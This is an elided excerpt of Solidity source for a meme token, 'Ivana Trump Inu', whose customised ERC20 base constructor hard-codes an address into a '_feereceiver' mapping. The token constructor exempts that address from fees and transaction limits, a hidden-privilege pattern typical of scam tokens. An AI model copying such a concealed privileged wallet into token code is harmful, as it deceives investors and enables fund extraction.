...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x5273798660DE7E8e1Cdd53FdB05a2112569a92ae] = _marketingwallet;
    }
...
contract IvanaTrumpInu is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Ivana Trump Inu", "IVI") {
        ...
        excludeFromFees(address(0x5273798660DE7E8e1Cdd53FdB05a2112569a92ae), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x5273798660DE7E8e1Cdd53FdB05a2112569a92ae), true);
